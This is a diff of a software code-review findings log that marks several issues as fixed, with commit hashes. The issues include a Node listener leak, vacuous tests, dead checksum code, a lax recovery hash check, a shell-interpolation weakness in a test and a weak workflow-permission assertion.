 `runSync()` unconditionally adds one listener each for `"exit"`, `"SIGINT"`, `"SIGTERM"`, and `"SIGHUP"` every time it runs, and never removes them (`process.off`/`removeListener` is never called). For a normal one-shot CLI invocation this is harmless because the process exits immediately afterward. But `runSync` is an exported function, not a script entry point, and nothing prevents it from being called more than once inside a single process (e.g. a test suite that calls it repeatedly, or any future in-process caller). Each extra call adds four more permanent listeners; past the default Node limit of 10 per event, `process.on("exit", ...)` and friends will start emitting `MaxListenersExceededWarning`, and every one of the accumulated closures (each capturing its own `syncLock`/`released` state) fires on the eventual signal/exit even though only the most recent call's lock is still meaningfully live. It's inert in the common CLI case, but it's a real, unbounded listener leak for any repeated in-process use — guard with `once()` plus explicit removal after `releaseSyncLockOnce()` fires, or register the handlers once at module scope instead of per-call.
 
+**Disposition:** fixed
+**Commit:** `63ec17827b478b05747b11d9b3c231cd816fea4c`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-098: Vacuous "malformed JSONL" test does not exercise malformed input
 
 **File:** `packages/memory/test/parser.test.ts`
@@ -2831,6 +3028,10 @@ block already has, or move `bug3Dir`/`bug4Dir` under the shared `tmpRoot`.
 
 The test's own comment admits it: "This test would need a fixture with malformed JSON. For now, we verify that valid fixtures don't throw." The body calls `parseConversationFile` on `short-conversation.jsonl` — a valid fixture already covered by three other tests in the same `describe` block — and asserts only `expect(result).toBeDefined()`. It never constructs or feeds malformed JSONL, so it cannot catch a real regression in the parser's malformed-line handling (e.g., a change that makes `parseConversationFile` throw on a truncated or non-JSON line instead of skipping it). I confirmed by grep that no other file in `packages/memory/test/` exercises malformed JSONL input (`verify.test.ts` even has a comment noting corruption detection is "harder to test... skipping for now"), so this is the only place such a regression could be caught, and it is not caught. A reader trusting the test name would believe malformed-input handling is under regression protection; it is not. Fix: either write a fixture with a genuinely malformed line (unterminated JSON, non-JSON garbage line mixed with valid lines) and assert the valid lines still parse, or rename the test to reflect what it actually verifies and drop the misleading claim.
 
+**Disposition:** fixed
+**Commit:** `67129698660c99b2ab870722e9828659d62abb7e`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-099: Vacuous "sidechain" test asserts nothing sidechain-specific
 
 **File:** `packages/memory/test/show.test.ts`
@@ -2839,6 +3040,10 @@ The test's own comment admits it: "This test would need a fixture with malformed
 
 The test body is `expect(markdown).toBeTruthy()` on the same fixture used by five other tests in the file, with a comment admitting "For now we test the structure - will need a fixture with sidechains later." `toBeTruthy()` on a non-empty markdown string is guaranteed to pass regardless of whether sidechain rendering logic exists, is correct, or is deleted entirely. I grepped `packages/memory/test/` and found no fixture or test elsewhere that exercises `isSidechain: true` content through `formatConversationAsMarkdown`/`formatConversationAsHTML`. This means sidechain formatting in `show.ts` has no regression coverage anywhere in the suite despite a test that reads as if it provides some. Fix: add a fixture line with `isSidechain: true` and assert on the specific rendering (e.g., a sidechain marker/heading), or remove the test rather than leave a false signal of coverage.
 
+**Disposition:** fixed
+**Commit:** `6c4ad266ee27bc7f9e2bdea6844023dc59d76717`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-100: Dead code computes SHA-512 of an empty string instead of the tarball's actual digest
 
 **File:** `packages/mint/src/release/candidate.ts`
@@ -2883,6 +3088,10 @@ dead map (and consider deleting `buildTarballChecksumRows`/`validateChecksumFile
 if truly unused) rather than leaving a plausible-looking but broken
 computation next to the correct one.
 
+**Disposition:** fixed
+**Commit:** `4e36913b5877e65180b4aaaf8c0d67e58e2b3c02`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-101: `computeResumeActions` treats an unobserved draft-asset hash as a match, not as "unknown"
 
 **File:** `packages/mint/src/release/recovery.ts`
@@ -2903,6 +3112,10 @@ require `draftAssetSha256` to be non-optional on `RegistrySnapshot` (forcing eve
 either provide a real hash or explicitly report "absent"), or block with a distinct
 `RECOVERY_DRAFT_ASSET_UNVERIFIABLE` code when the hash can't be observed, rather than silently accepting.
 
+**Disposition:** fixed
+**Commit:** `42d8cd90505e51689b8929680651d434fc405795`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-102: Unescaped shell interpolation of an environment-controlled path in the dogfood test
 
 **File:** `packages/mint/test/dogfood.test.ts`
@@ -2938,6 +3151,10 @@ piped into `tar -x -C dir` (or use `execFileSync('tar', ['-x', '-C', dir], { inp
 so the path is passed as an argv element rather than shell-interpolated text regardless of
 its contents.
 
+**Disposition:** fixed
+**Commit:** `47f3dc24ca10ef2928b9bad10557067d5d9c043a`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-103: Publish-workflow permission test accepts a downgrade its own name forbids
 
 **File:** `packages/mint/test/release-workflows.test.ts`
@@ -2963,6 +3180,10 @@ it('requires contents: write permission', () => {
 
 `publish.yml` currently declares `contents: write` (confirmed by reading the workflow directly), so there is no live defect today, but the test provides no protection against a regression that its name promises to catch. Fix: change the publish-workflow assertion to `expect(perms.contents).toBe('write')`, matching the certify-workflow test right below it.
 
+**Disposition:** fixed
+**Commit:** `571b270e00e54d87a622d60a0b23d95efce6714f`
+**Resolved:** 2026-09-04
+**Note:** —
 ### CR-104: `CostEstimate.per_model` mislabels `provider` when the same model string is billed under two different providers
 
 **File:** `packages/tab/crates/moe-tab-core/src/cost.rs`
